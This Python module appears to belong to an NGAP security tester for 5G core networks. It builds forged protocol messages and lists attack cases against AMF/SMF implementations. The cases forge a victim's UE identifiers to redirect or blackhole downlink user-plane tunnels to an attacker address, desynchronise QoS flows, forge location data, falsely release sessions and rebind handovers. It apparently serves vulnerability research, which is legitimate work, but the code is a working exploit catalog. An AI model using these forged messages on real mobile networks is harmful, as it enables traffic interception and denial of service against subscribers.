"""Attack-case catalog for NGAP messages p05-p09 (batch22_firstpriority).

  p05 PDUSessionResourceModifyIndication -> pdu_session_resource_modify_indication (NEW, this file)
  p06 PDUSessionResourceNotify           -> B.pdu_session_resource_notify           (exists)
  p07 UplinkNASTransport                 -> uplink_nas_transport                    (NEW, this file)
  p08 NASNonDeliveryIndication           -> nas_non_delivery_indication             (NEW, this file)
  p09 HandoverNotification               -> B.handover_notify                       (exists)

Each CASE realizes one row of that message's "## 4. Candidate Attack Table".
See docs/cases/cat_p05_p09.md for the human-readable catalog.

NOTE: this module was authored offline (the assistant's shell was blocked mid-session
and could not run the encode check). Please validate once with:
  python -c "from ngaptester.cases_p05_p09 import CASES,CFG; from ngaptester import ngap; \
             [ngap.encode(c['build'](CFG)) for c in CASES]; print('ALL ENCODE OK', len(CASES))"
procCodes/IE-ids/field-names below were taken from
openSource/open5gs/lib/asn1c/support/ngap-r16.7.0/38413-g70.asn.
"""
from __future__ import annotations

from . import builders as B, ngap
from .builders import _gtp_tunnel, _uli_nr

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- p05 NEW builder
def _modify_indication_transfer(attacker_ip: str, teid, qfis=(1,)):
    """PDUSessionResourceModifyIndicationTransfer (APER bytes). Carries the DL
    NG-U tunnel the AMF/SMF will program into the UPF (attacker endpoint)."""
    val = {
        "dLQosFlowPerTNLInformation": {
            "uPTransportLayerInformation": _gtp_tunnel(attacker_ip, teid),
            "associatedQosFlowList": [{"qosFlowIdentifier": q} for q in qfis],
        },
    }
    return ngap.encode_transfer("PDUSessionResourceModifyIndicationTransfer", val)


def pdu_session_resource_modify_indication(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                                           pdu_sessions=(1,), attacker_ip: str = "127.0.0.1",
                                           teid=1, qfis=(1,),
                                           include_uli: bool = False, nci: int | None = None):
    """PDU SESSION RESOURCE MODIFY INDICATION (Class 1, procedureCode 27).

    IEs (PDUSessionResourceModifyIndicationIEs): id-AMF-UE-NGAP-ID(10, reject),
    id-RAN-UE-NGAP-ID(85, reject), id-PDUSessionResourceModifyListModInd(63, reject),
    id-UserLocationInformation(121, ignore, optional). Forges a victim
    AMF-UE-NGAP-ID to modify the DL NG-U endpoint of a remote UE's PDU session
    (redirect/blackhole its downlink) — the modify-indication analogue of Path Switch.
    """
    modlist = [{"pDUSessionID": int(pid),
                "pDUSessionResourceModifyIndicationTransfer":
                    _modify_indication_transfer(attacker_ip, teid, qfis)}
               for pid in pdu_sessions]
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 63, "criticality": "reject",
         "value": ("PDUSessionResourceModifyListModInd", modlist)},
    ]
    if include_uli:
        ies.append({"id": 121, "criticality": "ignore",
                    "value": ("UserLocationInformation", _uli_nr(cfg, nci))})
    return ("initiatingMessage", {
        "procedureCode": 27, "criticality": "reject",
        "value": ("PDUSessionResourceModifyIndication", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- p07 NEW builder
def uplink_nas_transport(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                         nas_pdu: bytes = b"\x00", nci: int | None = None):
    """UPLINK NAS TRANSPORT (Class 2, procedureCode 46).

    IEs (UplinkNASTransport-IEs): id-AMF-UE-NGAP-ID(10, reject),
    id-RAN-UE-NGAP-ID(85, reject), id-NAS-PDU(38, reject), id-UserLocationInformation
    (121, ignore) — all mandatory. NAS-PDU is a placeholder OCTET STRING (NAS is
    integrity-protected end-to-end, so injection should be rejected by the AMF's NAS
    layer — a NEGATIVE control; the forgeable surface is the unauthenticated ULI)."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 38, "criticality": "reject", "value": ("NAS-PDU", nas_pdu)},
        {"id": 121, "criticality": "ignore",
         "value": ("UserLocationInformation", _uli_nr(cfg, nci))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 46, "criticality": "ignore",
        "value": ("UplinkNASTransport", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- p08 NEW builder
def nas_non_delivery_indication(amf_ue_id: int, ran_ue_id: int, *,
                                nas_pdu: bytes = b"\x00",
                                cause=("radioNetwork", "unspecified")):
    """NAS NON DELIVERY INDICATION (Class 2, procedureCode 19).

    IEs (NASNonDeliveryIndication-IEs): id-AMF-UE-NGAP-ID(10, reject),
    id-RAN-UE-NGAP-ID(85, reject), id-NAS-PDU(38, ignore), id-Cause(15, ignore) —
    all mandatory. Reports a (forged) failure to deliver a downlink NAS PDU for a
    victim; NAS-bound so mostly a NEGATIVE control / state-poison probe."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 38, "criticality": "ignore", "value": ("NAS-PDU", nas_pdu)},
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 19, "criticality": "ignore",
        "value": ("NASNonDeliveryIndication", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- CASES
CASES = [
    # ---- p05 PDUSessionResourceModifyIndication (procCode 27) ----------------
    {"id": "p05-a", "msg": "PDUSessionResourceModifyIndication",
     "desc": "Downlink NG-U endpoint hijack (reachable attacker TNL)",
     "build": lambda cfg: pdu_session_resource_modify_indication(
         1, 99, cfg, attacker_ip="172.30.200.9", teid=0x11111111)},
    {"id": "p05-b", "msg": "PDUSessionResourceModifyIndication",
     "desc": "Remote PDU-session blackholing (dead/unroutable DL TNL)",
     "build": lambda cfg: pdu_session_resource_modify_indication(
         1, 99, cfg, attacker_ip="10.255.255.255", teid=0xdeadbeef)},
    {"id": "p05-e", "msg": "PDUSessionResourceModifyIndication",
     "desc": "QoS-flow state desync (multiple forged QoS flow ids)",
     "build": lambda cfg: pdu_session_resource_modify_indication(
         1, 99, cfg, attacker_ip="172.30.200.9", teid=0x11111111, qfis=(1, 5, 9))},
    {"id": "p05-f", "msg": "PDUSessionResourceModifyIndication",
     "desc": "Forged location metadata (optional ULI, claimed NR-CGI)",
     "build": lambda cfg: pdu_session_resource_modify_indication(
         1, 99, cfg, attacker_ip="172.30.200.9", teid=0x11111111,
         include_uli=True, nci=0x999)},

    # ---- p06 PDUSessionResourceNotify (procCode 30, existing builder) --------
    {"id": "p06-a", "msg": "PDUSessionResourceNotify",
     "desc": "False notify/release of a remote UE's QoS/session (SD-Core 🔴)",
     "build": lambda cfg: B.pdu_session_resource_notify(1, 99)},
    # ---- p09 HandoverNotification (procCode 11, existing builder) ------------
    {"id": "p09-a", "msg": "HandoverNotify",
     "desc": "Rebind serving gNB -> attacker; DL misdelivery (OAI 🔴)",
     "build": lambda cfg: B.handover_notify(1, 99, cfg)},
]

# p07 UplinkNASTransport and p08 NASNonDeliveryIndication were dropped: their
# payload is a NAS-PDU that is integrity-protected end-to-end, so a rogue gNB
# cannot forge one the AMF will accept (negative controls, not attacks). The only
# forgeable IE there (UserLocationInformation) duplicates the generic location-
# poison effect already covered by p01-f / p05-f. The encoders below are kept
# unused for completeness/regression but are not exposed as cases.
